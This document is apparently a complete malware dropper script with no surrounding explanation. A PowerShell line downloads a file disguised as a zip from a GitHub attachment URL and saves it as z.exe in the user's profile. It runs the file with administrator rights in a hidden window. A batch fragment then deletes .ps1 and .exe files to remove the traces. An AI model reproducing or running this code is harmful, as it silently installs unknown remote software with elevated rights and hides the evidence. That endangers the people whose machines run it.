$Url = 'https://github.com/user-attachments/files/16326332/0.zip';[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = 'SilentlyContinue';$OutFile = Join-Path -Path $env:USERPROFILE -ChildPath 'z.exe';Invoke-WebRequest -Uri $Url -OutFile $OutFile;$InstallerPath = $OutFile;$Arguments = '-fullinstall';$Command = "Start-Process -FilePath '$InstallerPath' -ArgumentList '$Arguments' -Verb RunAs -WindowStyle Hidden";Invoke-Expression -Command $Command;;;;
@echo off
del /q *.ps1
del /q *.exe
exit
